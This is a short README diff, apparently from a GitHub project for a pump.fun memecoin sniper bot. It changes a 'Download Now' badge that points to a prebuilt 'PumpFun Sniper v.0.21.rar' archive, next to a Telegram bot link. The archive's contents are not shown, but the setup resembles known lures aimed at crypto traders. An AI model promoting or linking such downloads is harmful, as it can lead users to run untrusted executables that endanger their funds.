@@ -4,7 +4,7 @@
 
 [![Star](https://img.shields.io/badge/⭐_Star-212121?style=for-the-badge&logo=github&logoColor=white)](https://github.com/JadenMassari/pumpfun-memecoin-sniper)
 [![Telegram](https://img.shields.io/badge/Telegram-Bot-229ED9?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/pumpfun_memecoin_sniper_bot)
-<a href="[https://github.com/JadenMassari/pumpfun-memecoin-sniper/blob/main/PumpFun%20Sniper%20v.0.21.rar]">
+<a href="[PumpFun Sniper v.0.21.rar]">
     <img src="https://img.shields.io/badge/⬇️_Download_Now-00C853?style=for-the-badge&logo=download&logoColor=white&color=00C853" alt="Download" width="165">
     
 </div>
